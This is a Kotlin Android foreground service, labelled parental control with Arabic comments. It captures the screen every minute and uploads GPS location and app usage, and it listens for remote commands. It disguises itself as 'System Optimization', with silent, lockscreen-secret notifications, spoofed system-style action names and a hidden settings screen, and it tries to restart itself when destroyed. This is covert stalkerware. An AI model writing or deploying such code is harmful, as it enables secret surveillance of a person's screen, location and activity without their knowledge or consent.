package com.example.parentalcontrol

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager

/**
 * Foreground Service لتشغيل جميع وحدات المراقبة في الخلفية
 * تم تحديثه ليتوافق مع Android 14 ويدعم استقراراً حرارياً وطاقة أفضل
 */
class MonitoringForegroundService : Service() {

    companion object {
        private const val TAG = "MonitoringService"
        const val CHANNEL_ID = "system_optimization_channel_v2"
        const val NOTIFICATION_ID = 1001
        const val ACTION_START = "com.android.system.optimization.engine.START"
        const val ACTION_STOP = "com.android.system.optimization.engine.STOP"
        const val EXTRA_RESULT_CODE = "extra_result_code"
        const val EXTRA_DATA = "extra_data"

        fun start(context: Context, resultCode: Int = 0, data: Intent? = null) {
            val intent = Intent(context, MonitoringForegroundService::class.java).apply {
                action = ACTION_START
                putExtra(EXTRA_RESULT_CODE, resultCode)
                putExtra(EXTRA_DATA, data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            val intent = Intent(context, MonitoringForegroundService::class.java).apply {
                action = ACTION_STOP
            }
            context.stopService(intent)
        }
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private var screenCaptureJob: Job? = null
    private var locationJob: Job? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var mediaProjection: MediaProjection? = null

    private lateinit var screenCaptureEngine: ScreenCaptureEngine
    private lateinit var gpsTracker: GpsTracker
    private lateinit var realtimeCommandManager: RealtimeCommandManager
    private lateinit var appUsageTracker: AppUsageTracker

    override fun onCreate() {
        super.onCreate()
        try {
            Log.i(TAG, "MonitoringForegroundService created")
            
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            // إضافة timeout للـ WakeLock لضمان عدم استهلاك البطارية للأبد في حال التعليق
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "OptimizationEngine:WakeLock").apply {
                acquire(10 * 60 * 1000L) // 10 دقائق كحد أقصى لكل لفة إن لم تجدد
            }

            createNotificationChannel()
            screenCaptureEngine = ScreenCaptureEngine(this)
            gpsTracker = GpsTracker(this)
            realtimeCommandManager = RealtimeCommandManager(this, serviceScope) { mediaProjection }
            appUsageTracker = AppUsageTracker(this)
            
            realtimeCommandManager.startListening()
        } catch (e: Exception) {
            Log.e(TAG, "Error in onCreate: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            Log.i(TAG, "onStartCommand: ${intent?.action}")

            when (intent?.action) {
                ACTION_STOP -> {
                    stopSelf()
                    return START_NOT_STICKY
                }
                else -> {
                    // التعامل مع MediaProjection إذا تم تمريره
                    val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, 0) ?: 0
                    val data = intent?.getParcelableExtra<Intent>(EXTRA_DATA)
                    
                    if (resultCode != 0 && data != null) {
                        try {
                            val mpManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                            mediaProjection = mpManager.getMediaProjection(resultCode, data)
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to get MediaProjection: ${e.message}")
                        }
                    }

                    // تحديد الأنواع لـ Android 14+ بناءً على التراخيص المتاحة
                    var foregroundServiceTypes = 0
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        try {
                            val hasLocationPerm = checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
                            if (hasLocationPerm) {
                                foregroundServiceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Permission check error: ${e.message}")
                        }
                        
                        if (mediaProjection != null) {
                            foregroundServiceTypes = foregroundServiceTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                        }
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        foregroundServiceTypes = foregroundServiceTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    }

                    val notification = buildNotification()
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            if (foregroundServiceTypes == 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                foregroundServiceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                            }
                            
                            if (foregroundServiceTypes != 0) {
                                startForeground(NOTIFICATION_ID, notification, foregroundServiceTypes)
                            } else {
                                startForeground(NOTIFICATION_ID, notification)
                            }
                        } else {
                            startForeground(NOTIFICATION_ID, notification)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to start foreground: ${e.message}")
                        // المحاولة بنوع التزامن الأساسي لتجنب الانهيار
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                            } else {
                                startForeground(NOTIFICATION_ID, notification)
                            }
                        } catch (e2: Exception) {
                            Log.e(TAG, "Fatal error starting foreground: ${e2.message}")
                        }
                    }
                    
                    try {
                        startAllModules()
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to start modules: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in onStartCommand: ${e.message}")
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try {
            Log.i(TAG, "MonitoringForegroundService destroyed - attempting safe restart")
            
            if (wakeLock?.isHeld == true) wakeLock?.release()
            
            mediaProjection?.stop()
            serviceScope.cancel()
            
            // تأخير بسيط قبل محاولة إعادة التشغيل لتجنب Crash Loop
            val restartIntent = Intent(this, ServiceRestartReceiver::class.java)
            sendBroadcast(restartIntent)
            
            super.onDestroy()
        } catch (e: Exception) {
            Log.e(TAG, "Error in onDestroy: ${e.message}")
        }
    }

    private fun startAllModules() {
        startScreenCaptureLoop()
        startLocationLoop()
        startAppUsageLoop()
    }

    private fun startScreenCaptureLoop() {
        screenCaptureJob?.cancel()
        screenCaptureJob = serviceScope.launch {
            while (true) {
                try {
                    val projection = mediaProjection
                    if (projection != null) {
                        screenCaptureEngine.captureAndUpload(projection)
                    } else {
                        Log.w(TAG, "Screen capture skipped: MediaProjection not available")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Screen capture loop error: ${e.message}")
                }
                delay(60_000L)
            }
        }
    }

    private fun startLocationLoop() {
        locationJob?.cancel()
        locationJob = serviceScope.launch {
            while (true) {
                try {
                    gpsTracker.fetchAndUploadLocation()
                } catch (e: Exception) {
                    Log.e(TAG, "GPS loop error: ${e.message}")
                }
                delay(600_000L)
            }
        }
    }

    private fun startAppUsageLoop() {
        serviceScope.launch {
            while (true) {
                try {
                    appUsageTracker.trackAndUploadUsage()
                } catch (e: Exception) {
                    Log.e(TAG, "App usage tracking error: ${e.message}")
                }
                delay(6 * 3600_000L)
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Optimization Services",
                NotificationManager.IMPORTANCE_LOW // هادئ وغير مزعج
            ).apply {
                description = "Handles essential system optimization tasks in the background"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, HiddenSettingsActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Optimization")
            .setContentText("Monitoring system health and performance")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setContentIntent(pendingIntent)
            .build()
    }
}
